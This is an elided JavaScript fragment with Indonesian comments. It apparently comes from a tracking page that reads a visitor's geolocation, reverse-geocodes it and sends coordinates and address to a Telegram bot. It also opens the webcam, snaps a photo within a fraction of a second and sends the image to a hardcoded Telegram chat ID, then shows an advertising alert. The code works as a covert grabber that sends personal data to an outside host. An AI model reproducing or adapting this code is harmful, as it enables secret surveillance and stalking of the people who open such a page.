...
function showPosition(position) {
    ...
    fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&zoom=18&accept-language=id`, {
        headers: {
...
function sendLocationToTelegram(latitude, longitude, address) {
    const botToken = 'YOUR_BOT_TOKEN';  // Ganti dengan token bot kamu
    const chatId = 'YOUR_CHAT_ID';  // Ganti dengan ID chat yang kamu dapatkan
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const message = `📍 Lokasi Anda:\nLatitude: ${latitude.toFixed(5)}\nLongitude: ${longitude.toFixed(5)}\nAlamat: ${address}`;
    ...
    .then(data => {
        if (data.ok) {
            ...
            console.log('Terjadi kesalahan saat mengirim lokasi ke Telegram');
        }
    })
    .catch(error => {
    ...
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function (stream) {
                ...
                setTimeout(takePhoto, 100); // Ambil gambar setelah 3 detik
            })
            .catch(function (err) {
...
function sendToTelegram(imageData) {
    ...
    const chatId = '6385648443';  // Ganti dengan ID chat yang kamu dapatkan
    ...
    .then(data => {
        if (data.ok) {
            alert('Jasa buat website hubungi Rafashaalfian');
        } else {
